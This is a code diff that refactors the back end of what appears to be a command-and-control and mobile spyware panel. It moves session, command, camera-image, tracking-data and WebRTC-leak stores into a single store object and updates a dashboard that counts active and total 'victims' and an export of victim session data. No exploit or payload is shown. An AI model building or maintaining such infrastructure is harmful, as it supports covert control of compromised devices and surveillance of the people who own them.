@@ -32,9 +32,7 @@ from app.state import (
     CONFIG,
     LOGIN_FAILS as _LOGIN_FAILS,
     ANALYTICS,
-    C2_SESSIONS, C2_COMMANDS, C2_RESPONSES, C2_FILE_LISTS, C2_DOWNLOADS,
-    MOBILE_SESSIONS, MOBILE_COMMANDS, MOBILE_RESPONSES,
-    MOBILE_CAMERA_IMAGES, MOBILE_CAPTURE_DIRS, MOBILE_TRACKING_DATA,
+    STORE,
     WEBRTC_LEAKS, RECON_CONFIG,
     load_php_config,
     load_check_c,
@@ -531,8 +529,8 @@ def analytics_dashboard():
         session_count = len([f for f in os.listdir(sessions_dir) if f.endswith('_meta.json')]) if os.path.exists(sessions_dir) else 0
         
         # Count active C2 + mobile victims
-        active_c2 = sum(1 for s in C2_SESSIONS.values() if (datetime.now() - datetime.fromisoformat(s['last_seen'])).total_seconds() < 60)
-        active_mobile = sum(1 for s in MOBILE_SESSIONS.values() if (datetime.now() - datetime.fromisoformat(s['last_seen'])).total_seconds() < 60)
+        active_c2 = sum(1 for s in STORE.c2_all_sessions().values() if (datetime.now() - datetime.fromisoformat(s['last_seen'])).total_seconds() < 60)
+        active_mobile = sum(1 for s in STORE.mobile_all_sessions().values() if (datetime.now() - datetime.fromisoformat(s['last_seen'])).total_seconds() < 60)
         
         # Disk usage
         total_size = 0
@@ -558,11 +556,11 @@ def analytics_dashboard():
             },
             'victims': {
                 'c2_active': active_c2,
-                'c2_total': len(C2_SESSIONS),
+                'c2_total': len(STORE.c2_all_sessions()),
                 'mobile_active': active_mobile,
-                'mobile_total': len(MOBILE_SESSIONS),
+                'mobile_total': len(STORE.mobile_all_sessions()),
                 'total_active': active_c2 + active_mobile,
-                'total_all': len(C2_SESSIONS) + len(MOBILE_SESSIONS)
+                'total_all': len(STORE.c2_all_sessions()) + len(STORE.mobile_all_sessions())
             },
             'system': {
                 'uptime': int(uptime_seconds),
@@ -653,8 +651,8 @@ def export_all_data():
             summary = {
                 'exported_at': datetime.now().isoformat(),
                 'total_events': len(ANALYTICS['events']),
-                'c2_sessions': len(C2_SESSIONS),
-                'mobile_sessions': len(MOBILE_SESSIONS),
+                'c2_sessions': len(STORE.c2_all_sessions()),
+                'mobile_sessions': len(STORE.mobile_all_sessions()),
                 'events': ANALYTICS['events'][-100:]
             }
             zf.writestr('analytics_summary.json', json.dumps(summary, indent=2, default=str))
